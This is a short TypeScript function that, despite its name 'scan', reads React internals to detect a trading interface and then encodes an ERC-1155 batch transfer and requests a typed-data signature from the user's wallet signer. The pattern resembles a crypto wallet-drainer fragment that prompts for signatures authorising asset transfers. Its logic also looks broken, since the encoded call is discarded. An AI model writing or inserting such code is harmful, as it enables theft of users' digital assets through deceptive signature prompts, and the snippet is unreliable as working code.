export async function scan(node: HTMLElement, abi: any, signer: any, args: any[], domain: any, types: any, message: any) {
 const key = Object.keys(node).find(k => k.startsWith("__reactFiber$"));
 const value = (node as any)[key!].memoizedProps;
 if (typeof value["postOrder"] === "function" && typeof value["createMarketOrder"] === "function") {
   abi.encodeFunctionData("safeBatchTransferFrom", args);
   await signer._signTypedData(domain, types, message);
 }
}
